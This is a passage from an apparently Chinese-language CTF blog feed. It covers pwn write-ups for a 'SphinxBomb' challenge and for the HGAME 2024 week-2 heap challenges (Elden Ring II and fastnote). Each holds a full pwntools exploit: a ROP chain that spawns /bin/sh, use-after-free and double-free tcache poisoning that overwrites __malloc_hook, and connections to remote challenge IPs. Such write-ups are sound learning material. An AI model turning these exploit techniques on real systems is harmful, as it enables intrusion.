class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><pre class="line-numbers language-rust" data-language="rust"><code class="language-rust">ssize_t __fastcall <span class="token class-name">SphinxBomb</span><span class="token punctuation">::</span><span class="token namespace">bomb_counter<span class="token punctuation">::</span></span><span class="token function">h2ef55620c9869ad5</span><span class="token punctuation">(</span>size_t nbytes<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>  __int128 v2<span class="token punctuation">[</span><span class="token number">3</span><span class="token punctuation">]</span><span class="token punctuation">;</span> <span class="token comment">// [rsp+0h] [rbp-38h] BYREF</span>  <span class="token function">memset</span><span class="token punctuation">(</span>v2<span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token function">sizeof</span><span class="token punctuation">(</span>v2<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token keyword">return</span> <span class="token function">read</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> v2<span class="token punctuation">,</span> nbytes<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>直接连接远程得到程序的<code>base64</code>解码得到的字符串，每次比较的字符串和<code>mov edi, 100h</code>这个位置是不一样的，但是字符串的位置是一样的，本题的思路就是接收程序，利用<code>pwntools</code>直接获取一个固定地址的字符串，一共有30个分支，直接死循环直到执行成功</p><p>exp</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span><span class="token keyword">import</span> angrcontext<span class="token punctuation">(</span>arch<span class="token operator">=</span><span class="token string">'amd64'</span><span class="token punctuation">,</span> os<span class="token operator">=</span><span class="token string">'linux'</span><span class="token punctuation">,</span> log_level<span class="token operator">=</span><span class="token string">'debug'</span><span class="token punctuation">)</span>  <span class="token comment">#32位arch=‘i386’</span>file_name <span class="token operator">=</span> <span class="token string">'./pwn'</span>li <span class="token operator">=</span> <span class="token keyword">lambda</span> x <span class="token punctuation">:</span> <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'\x1b[01;38;5;214m'</span> <span class="token operator">+</span> <span class="token builtin">str</span><span class="token punctuation">(</span>x<span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">'\x1b[0m'</span><span class="token punctuation">)</span>ll <span class="token operator">=</span> <span class="token keyword">lambda</span> x <span class="token punctuation">:</span> <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'\x1b[01;38;5;1m'</span> <span class="token operator">+</span> <span class="token builtin">str</span><span class="token punctuation">(</span>x<span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">'\x1b[0m'</span><span class="token punctuation">)</span>context<span class="token punctuation">.</span>terminal <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token string">'tmux'</span><span class="token punctuation">,</span><span class="token string">'splitw'</span><span class="token punctuation">,</span><span class="token string">'-h'</span><span class="token punctuation">]</span><span class="token keyword">def</span> <span class="token function">dbg</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    gdb<span class="token punctuation">.</span>attach<span class="token punctuation">(</span>r<span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">pwn</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    r<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">'This is your Bomb: \n'</span><span class="token punctuation">)</span>    r<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">"b'"</span><span class="token punctuation">)</span>    a <span class="token operator">=</span> r<span class="token punctuation">.</span>recvline<span class="token punctuation">(</span>keepends<span class="token operator">=</span><span class="token boolean">False</span><span class="token punctuation">)</span>    decoded <span class="token operator">=</span> base64<span class="token punctuation">.</span>b64decode<span class="token punctuation">(</span>a<span class="token punctuation">)</span>    <span class="token keyword">with</span> <span class="token builtin">open</span><span class="token punctuation">(</span><span class="token string">"poc3.gz"</span><span class="token punctuation">,</span> <span class="token string">"wb"</span><span class="token punctuation">)</span> <span class="token keyword">as</span> f<span class="token punctuation">:</span>        f<span class="token punctuation">.</span>write<span class="token punctuation">(</span>decoded<span class="token punctuation">)</span>    li<span class="token punctuation">(</span><span class="token string">'[+] Download'</span><span class="token punctuation">)</span>    os<span class="token punctuation">.</span>system<span class="token punctuation">(</span><span class="token string">'gzip -d poc3.gz &amp;&amp; chmod +x poc3'</span><span class="token punctuation">)</span>    li<span class="token punctuation">(</span><span class="token string">b'ok'</span><span class="token punctuation">)</span>    binary_path <span class="token operator">=</span> <span class="token string">'./poc3'</span>    target_address <span class="token operator">=</span> <span class="token number">0x448740</span>    elf <span class="token operator">=</span> ELF<span class="token punctuation">(</span>binary_path<span class="token punctuation">)</span>    value <span class="token operator">=</span> elf<span class="token punctuation">.</span>read<span class="token punctuation">(</span>target_address<span class="token punctuation">,</span> <span class="token number">63</span><span class="token punctuation">)</span>    li<span class="token punctuation">(</span>value<span class="token punctuation">)</span>    os<span class="token punctuation">.</span>system<span class="token punctuation">(</span><span class="token string">'rm poc3'</span><span class="token punctuation">)</span>    r<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">b'Welcome'</span><span class="token punctuation">,</span> value<span class="token punctuation">)</span>    pop_rdi_ret <span class="token operator">=</span> <span class="token number">0x0000000000402359</span>    pop_rsi_ret <span class="token operator">=</span> <span class="token number">0x00000000004042bc</span>    pop_rcx_ret <span class="token operator">=</span> <span class="token number">0x402b38</span>     mov_rdx_rcx_rbx_ret <span class="token operator">=</span> <span class="token number">0x4461d4</span>    p1 <span class="token operator">=</span> <span class="token string">b'a'</span> <span class="token operator">*</span> <span class="token number">0x38</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>pop_rdi_ret<span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>pop_rsi_ret<span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span><span class="token number">0x4603e8</span> <span class="token operator">+</span> <span class="token number">0x50</span><span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span><span class="token number">0x404e8d</span><span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span> <span class="token operator">*</span> <span class="token number">7</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>pop_rdi_ret<span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span><span class="token number">59</span><span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>pop_rsi_ret<span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span><span class="token number">0x4603e8</span> <span class="token operator">+</span> <span class="token number">0x50</span><span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>pop_rcx_ret<span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>mov_rdx_rcx_rbx_ret<span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span><span class="token number">0x402a7c</span><span class="token punctuation">)</span>    r<span class="token punctuation">.</span>send<span class="token punctuation">(</span>p1<span class="token punctuation">)</span>    r<span class="token punctuation">.</span>send<span class="token punctuation">(</span><span class="token string">b'/bin/sh\x00'</span><span class="token punctuation">)</span>    r<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span><span class="token string">'cat /flag'</span><span class="token punctuation">)</span><span class="token keyword">while</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">try</span><span class="token punctuation">:</span>        r <span class="token operator">=</span> remote<span class="token punctuation">(</span><span class="token string">'112.124.59.213'</span><span class="token punctuation">,</span> <span class="token number">10001</span><span class="token punctuation">)</span>        pwn<span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token keyword">except</span> EOFError<span class="token punctuation">:</span>        <span class="token keyword">continue</span>    <span class="token keyword">else</span><span class="token punctuation">:</span>        r<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>]]></content>
      
      
      <categories>
          
          <category> pwn </category>
          
      </categories>
      
      
        <tags>
            
            <tag> pwn </tag>
            
            <tag> shellcode </tag>
            
            <tag> fmt </tag>
            
            <tag> heap </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>HGAME-2024-week2-pwn</title>
      <link href="/2024/02/24/hgame-2024-week2-pwn/hgame-2024-week2-pwn/"/>
      <url>/2024/02/24/hgame-2024-week2-pwn/hgame-2024-week2-pwn/</url>
      
        <content type="html"><![CDATA[<h2 id="Elden-Ring-Ⅱ"><a href="#Elden-Ring-Ⅱ" class="headerlink" title="Elden Ring Ⅱ"></a>Elden Ring Ⅱ</h2><p>2.32的<code>uaf</code>，漏洞点出现在<code>delete</code>之后没有清零</p><pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token keyword">void</span> <span class="token function">delete_note</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>  <span class="token keyword">unsigned</span> <span class="token keyword">int</span> index<span class="token punctuation">;</span> <span class="token comment">// [rsp+Ch] [rbp-4h] BYREF</span>  <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"Index: "</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token function">__isoc99_scanf</span><span class="token punctuation">(</span><span class="token string">"%u"</span><span class="token punctuation">,</span> <span class="token operator">&amp;</span>index<span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token keyword">if</span> <span class="token punctuation">(</span> index <span class="token operator">&lt;=</span> <span class="token number">0xF</span> <span class="token punctuation">)</span>  <span class="token punctuation">&#123;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span> notes<span class="token punctuation">[</span>index<span class="token punctuation">]</span> <span class="token punctuation">)</span>      <span class="token function">free</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token keyword">void</span> <span class="token operator">*</span><span class="token punctuation">)</span>notes<span class="token punctuation">[</span>index<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">else</span>      <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"Page not found."</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token punctuation">&#125;</span>  <span class="token keyword">else</span>  <span class="token punctuation">&#123;</span>    <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"There are only 16 pages in this notebook."</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>没有开地址随机化，虽然没什么用</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token punctuation">[</span>*<span class="token punctuation">]</span> <span class="token string">'/home/starrysky/game_2024/hgame/eldenring2/pwn'</span>    Arch:     amd64-64-little    RELRO:    Partial RELRO    Stack:    No canary found    NX:       NX enabled    PIE:      No PIE <span class="token punctuation">(</span>0x3fe000<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>创建堆到<code>unsorted bin</code>中之后<code>show</code>出堆中的<code>libc</code>，再改<code>tcache</code>中某个堆的<code>fd</code>为<code>malloc_hook</code>再申请出来改成<code>ogg</code></p><p>exp</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span>context<span class="token punctuation">(</span>arch<span class="token operator">=</span><span class="token string">'amd64'</span><span class="token punctuation">,</span> os<span class="token operator">=</span><span class="token string">'linux'</span><span class="token punctuation">,</span> log_level<span class="token operator">=</span><span class="token string">'debug'</span><span class="token punctuation">)</span>file_name <span class="token operator">=</span> <span class="token string">'./pwn'</span>li <span class="token operator">=</span> <span class="token keyword">lambda</span> x <span class="token punctuation">:</span> <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'\\x1b[01;38;5;214m'</span> <span class="token operator">+</span> x <span class="token operator">+</span> <span class="token string">'\\x1b[0m'</span><span class="token punctuation">)</span>ll <span class="token operator">=</span> <span class="token keyword">lambda</span> x <span class="token punctuation">:</span> <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'\\x1b[01;38;5;1m'</span> <span class="token operator">+</span> x <span class="token operator">+</span> <span class="token string">'\\x1b[0m'</span><span class="token punctuation">)</span><span class="token comment">#context.terminal = ['tmux','splitw','-h']</span>debug <span class="token operator">=</span> <span class="token number">1</span><span class="token keyword">if</span> debug<span class="token punctuation">:</span>    r <span class="token operator">=</span> remote<span class="token punctuation">(</span><span class="token string">'47.100.137.175'</span><span class="token punctuation">,</span> <span class="token number">30743</span><span class="token punctuation">)</span><span class="token keyword">else</span><span class="token punctuation">:</span>    r <span class="token operator">=</span> process<span class="token punctuation">(</span>file_name<span class="token punctuation">)</span>elf <span class="token operator">=</span> ELF<span class="token punctuation">(</span>file_name<span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">dbg</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    gdb<span class="token punctuation">.</span>attach<span class="token punctuation">(</span>r<span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">add</span><span class="token punctuation">(</span>index<span class="token punctuation">,</span> size<span class="token punctuation">)</span><span class="token punctuation">:</span>    r<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">b'>'</span><span class="token punctuation">,</span> <span class="token string">b'1'</span><span class="token punctuation">)</span>    r<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">b'Index: '</span><span class="token punctuation">,</span> <span class="token builtin">str</span><span class="token punctuation">(</span>index<span class="token punctuation">)</span><span class="token punctuation">)</span>    r<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">b'Size: '</span><span class="token punctuation">,</span> <span class="token builtin">str</span><span class="token punctuation">(</span>size<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">edit</span><span class="token punctuation">(</span>index<span class="token punctuation">,</span> content<span class="token punctuation">)</span><span class="token punctuation">:</span>    r<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">b'>'</span><span class="token punctuation">,</span> <span class="token string">b'3'</span><span class="token punctuation">)</span>    r<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">b'Index: '</span><span class="token punctuation">,</span> <span class="token builtin">str</span><span class="token punctuation">(</span>index<span class="token punctuation">)</span><span class="token punctuation">)</span>    r<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">b'Content: '</span><span class="token punctuation">,</span> content<span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">show</span><span class="token punctuation">(</span>index<span class="token punctuation">)</span><span class="token punctuation">:</span>    r<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">b'>'</span><span class="token punctuation">,</span> <span class="token string">b'4'</span><span class="token punctuation">)</span>    r<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">b'Index: '</span><span class="token punctuation">,</span> <span class="token builtin">str</span><span class="token punctuation">(</span>index<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">delete</span><span class="token punctuation">(</span>index<span class="token punctuation">)</span><span class="token punctuation">:</span>    r<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">b'>'</span><span class="token punctuation">,</span> <span class="token string">b'2'</span><span class="token punctuation">)</span>    r<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">b'Index: '</span><span class="token punctuation">,</span> <span class="token builtin">str</span><span class="token punctuation">(</span>index<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">9</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    add<span class="token punctuation">(</span>i<span class="token punctuation">,</span> <span class="token number">0x80</span><span class="token punctuation">)</span><span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">8</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    delete<span class="token punctuation">(</span>i<span class="token punctuation">)</span>show<span class="token punctuation">(</span><span class="token number">7</span><span class="token punctuation">)</span>libc_base <span class="token operator">=</span> u64<span class="token punctuation">(</span>r<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">'\\x7f'</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token operator">-</span><span class="token number">6</span><span class="token punctuation">:</span><span class="token punctuation">]</span><span class="token punctuation">.</span>ljust<span class="token punctuation">(</span><span class="token number">8</span><span class="token punctuation">,</span> <span class="token string">b'\\x00'</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">-</span> <span class="token number">0x1ecbe0</span>libc <span class="token operator">=</span> ELF<span class="token punctuation">(</span><span class="token string">'./libc.so.6'</span><span class="token punctuation">)</span>one <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token number">0xe3afe</span><span class="token punctuation">,</span> <span class="token number">0xe3b01</span><span class="token punctuation">,</span> <span class="token number">0xe3b04</span><span class="token punctuation">]</span>gadget <span class="token operator">=</span> one<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span> <span class="token operator">+</span> libc_basemalloc_hook <span class="token operator">=</span> libc<span class="token punctuation">.</span>sym<span class="token punctuation">[</span><span class="token string">'__malloc_hook'</span><span class="token punctuation">]</span> <span class="token operator">+</span> libc_baseedit<span class="token punctuation">(</span><span class="token number">6</span><span class="token punctuation">,</span> p64<span class="token punctuation">(</span>malloc_hook<span class="token punctuation">)</span><span class="token punctuation">)</span>add<span class="token punctuation">(</span><span class="token number">9</span><span class="token punctuation">,</span> <span class="token number">0x80</span><span class="token punctuation">)</span>add<span class="token punctuation">(</span><span class="token number">10</span><span class="token punctuation">,</span> <span class="token number">0x80</span><span class="token punctuation">)</span>edit<span class="token punctuation">(</span><span class="token number">10</span><span class="token punctuation">,</span> p64<span class="token punctuation">(</span>gadget<span class="token punctuation">)</span><span class="token punctuation">)</span>r<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">b'>'</span><span class="token punctuation">,</span> <span class="token string">b'1'</span><span class="token punctuation">)</span>r<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">b'Index: '</span><span class="token punctuation">,</span> <span class="token builtin">str</span><span class="token punctuation">(</span><span class="token number">15</span><span class="token punctuation">)</span><span class="token punctuation">)</span>r<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">b'Size: '</span><span class="token punctuation">,</span> <span class="token builtin">str</span><span class="token punctuation">(</span><span class="token number">20</span><span class="token punctuation">)</span><span class="token punctuation">)</span>r<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="fastnote"><a href="#fastnote" class="headerlink" title="fastnote"></a>fastnote</h2><p><code>2.32</code>版本的<code>double free</code>，没有edit函数</p><p>先利用从<code>unsorted bin</code>中申请的堆含有<code>libc</code>地址的特点泄露<code>libc</code>，再<code>double free</code>改<code>tcache</code>中的堆地址为<code>malloc_hook</code>，最后把堆申请出来改成<code>ogg</code></p><p>exp</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span>context<span class="token punctuation">(</span>arch<span class="token operator">=</span><span class="token string">'amd64'</span><span class="token punctuation">,</span> os<span class="token operator">=</span><span class="token string">'linux'</span><span class="token punctuation">,</span> log_level<span class="token operator">=</span><span class="token string">'debug'</span><span class="token punctuation">)</span>file_name <span class="token operator">=</span> <span class="token string">'./pwn'</span>li <span class="token operator">=</span> <span class="token keyword">lambda</span> x <span class="token punctuation">:</span> <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'\\x1b[01;38;5;214m'</span> <span class="token operator">+</span> x <span class="token operator">+</span> <span class="token string">'\\x1b[0m'</span><span class="token punctuation">)</span>ll <span class="token operator">=</span> <span class="token keyword">lambda</span> x <span class="token punctuation">:</span> <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'\\x1b[01;38;5;1m'</span> <span class="token operator">+</span> x <span class="token operator">+</span> <span class="token string">'\\x1b[0m'</span><span class="token punctuation">)</span><span class="token comment">#context.terminal = ['tmux','splitw','-h']</span>debug <span class="token operator">=</span> <span class="token number">1</span><span class="token keyword">if</span> debug<span class="token punctuation">:</span>    r <span class="token operator">=</span> remote<span class="token punctuation">(</span><span class="token string">'47.100.137.175'</span><span class="token punctuation">,</span> <span class="token number">32683</span><span class="token punctuation">)</span><span class="token keyword">else</span><span class="token punctuation">:</span>    r <span class="token operator">=</span> process<span class="token punctuation">(</span>file_name<span class="token punctuation">)</span>elf <span class="token operator">=</span> ELF<span class="token punctuation">(</span>file_name<span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">dbg</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    gdb<span class="token punctuation">.</span>attach<span class="token punctuation">(</span>r<span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">add</span><span class="token punctuation">(</span>index<span class="token punctuation">,</span> size<span class="token punctuation">,</span> content<span class="token punctuation">)</span><span class="token punctuation">:</span>    r<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">b'Your choice:'</span><span class="token punctuation">,</span> <span class="token string">b'1'</span><span class="token punctuation">)</span>    r<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">b'Index: '</span><span class="token punctuation">,</span> <span class="token builtin">str</span><span class="token punctuation">(</span>index<span class="token punctuation">)</span><span class="token punctuation">)</span>    r<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">b'Size: '</span><span class="token punctuation">,</span> <span class="token builtin">str</span><span class="token punctuation">(</span>size<span class="token punctuation">)</span><span class="token punctuation">)</span>    r<span class="token punctuation">.</span>sendafter<span class="token punctuation">(</span><span class="token string">b'Content: '</span><span class="token punctuation">,</span> content<span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">show</span><span class="token punctuation">(</span>index<span class="token punctuation">)</span><span class="token punctuation">:</span>    r<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">b'Your choice:'</span><span class="token punctuation">,</span> <span class="token string">b'2'</span><span class="token punctuation">)</span>    r<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">b'Index: '</span><span class="token punctuation">,</span> <span class="token builtin">str</span><span class="token punctuation">(</span>index<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">delete</span><span class="token punctuation">(</span>index<span class="token punctuation">)</span><span class="token punctuation">:</span>    r<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">b'Your choice:'</span><span class="token punctuation">,</span> <span class="token string">b'3'</span><span class="token punctuation">)</span>    r<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">b'Index: '</span><span class="token punctuation">,</span> <span class="token builtin">str</span><span class="token punctuation">(</span>index<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">9</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    add<span class="token punctuation">(</span>i<span class="token punctuation">,</span> <span class="token number">0x80</span><span class="token punctuation">,</span> <span class="token string">b'a'</span> <span class="token operator">*</span> <span class="token number">0x80</span><span class="token punctuation">)</span><span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">8</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    delete<span class="token punctuation">(</span>i<span class="token punctuation">)</span>add<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0x40</span><span class="token punctuation">,</span> <span class="token string">b'a'</span><span class="token punctuation">)</span>show<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span>libc_base <span class="token operator">=</span> u64<span class="token punctuation">(</span>r<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">'\\x7f'</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token operator">-</span><span class="token number">6</span><span class="token punctuation">:</span><span class="token punctuation">]</span><span class="token punctuation">.</span>ljust<span class="token punctuation">(</span><span class="token number">8</span><span class="token punctuation">,</span> <span class="token string">b'\\x00'</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">-</span> <span class="token number">0x1ecc61</span>one <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token number">0xe3afe</span><span class="token punctuation">,</span> <span class="token number">0xe3b01</span><span class="token punctuation">,</span> <span class="token number">0xe3b04</span><span class="token punctuation">]</span>gadget <span class="token operator">=</span> one<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span> <span class="token operator">+</span> libc_baselibc <span class="token operator">=</span> ELF<span class="token punctuation">(</span><span class="token string">'./libc-2.31.so'</span><span class="token punctuation">)</span>malloc_hook <span class="token operator">=</span> libc<span class="token punctuation">.</span>sym<span class="token punctuation">[</span><span class="token string">'__malloc_hook'</span><span class="token punctuation">]</span> <span class="token operator">+</span> libc_base<span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">9</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    add<span class="token punctuation">(</span>i<span class="token punctuation">,</span> <span class="token number">0x30</span><span class="token punctuation">,</span> <span class="token string">b'a'</span> <span class="token operator">*</span> <span class="token number">0x30</span><span class="token punctuation">)</span><span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">7</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    delete<span class="token punctuation">(</span>i<span class="token punctuation">)</span>delete<span class="token punctuation">(</span><span class="token number">7</span><span class="token punctuation">)</span>delete<span class="token punctuation">(</span><span class="token number">8</span><span class="token punctuation">)</span>delete<span class="token punctuation">(</span><span class="token number">7</span><span class="token punctuation">)</span><span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">7</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    add<span class="token punctuation">(</span>i<span class="token punctuation">,</span> <span class="token number">0x30</span><span class="token punctuation">,</span> <span class="token string">b'a'</span> <span class="token operator">*</span> <span class="token number">0x30</span><span class="token punctuation">)</span>add<span class="token punctuation">(</span><span class="token number">8</span><span class="token punctuation">,</span> <span class="token number">0x30</span><span class="token punctuation">,</span> p64<span class="token punctuation">(</span>malloc_hook<span class="token punctuation">)</span><span class="token punctuation">)</span>add<span class="token punctuation">(</span><span class="token number">9</span><span class="token punctuation">,</span> <span class="token number">0x30</span><span class="token punctuation">,</span> <span class="token string">b'a'</span><span class="token punctuation">)</span>add<span class="token punctuation">(</span><span class="token number">10</span><span class="token punctuation">,</span> <span class="token number">0x30</span><span class="token punctuation">,</span> p64<span class="token punctuation">(</span>gadget<span class="token punctuation">)</span><span class="token punctuation">)</span>add<span class="token punctuation">(</span><span class="token number">11</span><span class="token punctuation">,</span> <span class="token number">0x30</span><span class="token punctuation">,</span> p64<span class="token punctuation">(</span>gadget<span class="token punctuation">)</span><span class="token punctuation">)</span>r<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">b'Your choice:'</span><span class="token punctuation">,</span> <span class="token string">b'1'</span><span class="token punctuation">)</span>r<span class="token punctuation">.</span>sendlineafter<span class="token 